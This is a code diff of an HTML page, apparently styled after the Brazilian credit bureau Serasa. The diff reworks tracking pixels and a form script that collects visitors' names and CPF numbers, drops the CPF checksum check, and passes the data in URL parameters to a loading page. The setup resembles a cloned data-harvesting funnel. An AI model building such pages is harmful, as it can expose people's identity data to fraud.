@@ -18,30 +18,6 @@
       a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
       document.head.appendChild(a);
 </script>
-
-<script>
-      !function(f,b,e,v,n,t,s)
-      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n; n.push=n; n.loaded=!0; n.version='2.0';
-      n.queue=[]; t=b.createElement(e); t.async=!0;
-      t.src=v; s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)}(window, document,'script',
-      'https://connect.facebook.net/en_US/fbevents.js');
-
-      // Inicializa o pixel normalmente
-      fbq('init', '769736156134629');
-
-      // Dispara o PageView SOMENTE após o UTMify carregar
-      document.addEventListener("utmify-loaded", () => {
-        fbq("track", "PageView");
-      });
-</script>
-
-  <noscript>
-    <img height="1" width="1" style="display:none"
-         src="https://www.facebook.com/tr?id=769736156134629&ev=PageView&noscript=1"/>
-  </noscript>
   
 <!-- Config do pixel face + utm -->
 
@@ -1805,25 +1781,10 @@
             data-id="75b92fcc"
             data-element_type="widget"
             data-widget_type="html.default"
+            data-settings='{"raw":"<script src=\"../scripts/utms/latest.js\" data-utmify-prevent-subids=\"\" async=\"\" defer=\"\"></script>\n<script>\n  window.pixelId = \"67f846e3e19eff9c461bb215\";\n  var a = document.createElement(\"script\");\n  a.setAttribute(\"async\", \"\");\n  a.setAttribute(\"defer\", \"\");\n  a.setAttribute(\"src\", \"https://cdn.utmify.com.br/scripts/pixel/pixel.js\");\n  document.head.appendChild(a);\n</script>"}'
           >
             <div class="elementor-widget-container">
-              <script
-                src="../scripts/utms/latest.js"
-                data-utmify-prevent-subids=""
-                async=""
-                defer=""
-              ></script>
-              <script>
-                window.pixelId = "67f846e3e19eff9c461bb215";
-                var a = document.createElement("script");
-                a.setAttribute("async", "");
-                a.setAttribute("defer", "");
-                a.setAttribute(
-                  "src",
-                  "https://cdn.utmify.com.br/scripts/pixel/pixel.js"
-                );
-                document.head.appendChild(a);
-              </script>
+              
             </div>
           </div>
           <div
@@ -1873,105 +1834,61 @@
     </script>
     <script id="form-redirect-script">
       document.addEventListener("DOMContentLoaded", function () {
-        const cpfForm = document.getElementById("serasa-cpf-form"); // Usa o ID do formulário
-
+        const cpfForm = document.getElementById("serasa-cpf-form");
+        
         if (cpfForm) {
-          const nomeInput = cpfForm.querySelector("#form-field-nome"); // Campo de nome
-          const cpfInput = cpfForm.querySelector("#form-field-cpf_cnpj"); // Procura dentro do formulário
-          const cpfErrorMessage = cpfForm.querySelector("#cpf-error-message"); // Procura dentro do formulário
-
-          if (!nomeInput) {
-            console.error(
-              "Campo de input Nome (id='form-field-nome') não encontrado dentro do formulário."
-            );
-            return;
-          }
-          if (!cpfInput) {
-            console.error(
-              "Campo de input CPF (id='form-field-cpf_cnpj') não encontrado dentro do formulário."
-            );
-            return;
-          }
-          if (!cpfErrorMessage) {
-            console.warn(
-              "Elemento para mensagem de erro do CPF (id='cpf-error-message') não encontrado."
-            );
-          }
-
           cpfForm.addEventListener("submit", function (event) {
             event.preventDefault();
-
+            
+            const nomeInput = document.getElementById("form-field-nome");
+            const cpfInput = document.getElementById("form-field-cpf_cnpj");
+            
+            if (!nomeInput || !cpfInput) {
+              console.error("Campos não encontrados");
+              return;
+            }
+            
             let nomeValue = nomeInput.value.trim();
             let cpfValue = cpfInput.value.replace(/\D/g, "");
-            let isValid = true;
-
+            
             // Validação do Nome
             if (nomeValue === "" || nomeValue.length < 2) {
               alert("Por favor, digite seu nome completo.");
               nomeInput.focus();
               return;
             }
-
-            // Validação de CPF (mesma lógica da resposta anterior)
-            if (cpfValue.length !== 11) {
-              isValid = false;
-            } else {
-              if (/^(\d)\1+$/.test(cpfValue)) {
-                isValid = false;
-              } else {
-                let sum = 0;
-                let remainder;
-                for (let i = 1; i <= 9; i++) {
-                  sum += parseInt(cpfValue.substring(i - 1, i)) * (11 - i);
-                }
-                remainder = (sum * 10) % 11;
-                if (remainder === 10 || remainder === 11) {
-                  remainder = 0;
-                }
-                if (remainder !== parseInt(cpfValue.substring(9, 10))) {
-                  isValid = false;
-                }
-                if (isValid) {
-                  sum = 0;
-                  for (let i = 1; i <= 10; i++) {
-                    sum += parseInt(cpfValue.substring(i - 1, i)) * (12 - i);
-                  }
-                  remainder = (sum * 10) % 11;
-                  if (remainder === 10 || remainder === 11) {
-                    remainder = 0;
-                  }
-                  if (remainder !== parseInt(cpfValue.substring(10, 11))) {
-                    isValid = false;
-                  }
-                }
-              }
-            }
-
-            if (!isValid) {
+            
+            // Validação de CPF
+            if (cpfValue.length !== 11 || /^(\d)\1+$/.test(cpfValue)) {
+              const cpfErrorMessage = document.getElementById("cpf-error-message");
               if (cpfErrorMessage) {
-                cpfErrorMessage.textContent =
-                  "CPF inválido. Por favor, verifique e tente novamente.";
+                cpfErrorMessage.textContent = "CPF inválido. Por favor, verifique e tente novamente.";
                 cpfErrorMessage.style.display = "block";
               }
               cpfInput.focus();
               return;
             }
-
+            
+            // Remove mensagem de erro se existir
+            const cpfErrorMessage = document.getElementById("cpf-error-message");
             if (cpfErrorMessage) {
               cpfErrorMessage.style.display = "none";
             }
-
-            const nextPageBaseUrl = "./loading.html"; // SUBSTITUA PELA SUA URL DE DESTINO CORRETA
-
-            let currentUrlParams = new URLSearchParams(window.location.search);
+            
+            // Pega todos os parâmetros da URL atual
+            const currentUrlParams = new URLSearchParams(window.location.search);
+            
+            // Adiciona nome e CPF aos parâmetros
             currentUrlParams.set("nome", encodeURIComponent(nomeValue));
             currentUrlParams.set("cpf", cpfValue);
-
-            window.location.href =
-              nextPageBaseUrl + "?" + currentUrlParams.toString();
+            
+            // Monta a URL da página de loading com TODOS os parâmetros
+            const loadingPageUrl = "./loading.html";
+            const fullUrl = loadingPageUrl + "?" + currentUrlParams.toString();
+            
+            // Redireciona para a página de loading
+            window.location.href = fullUrl;
           });
-        } else {
-          console.error("Formulário com id='serasa-cpf-form' não encontrado.");
         }
       });
     </script>
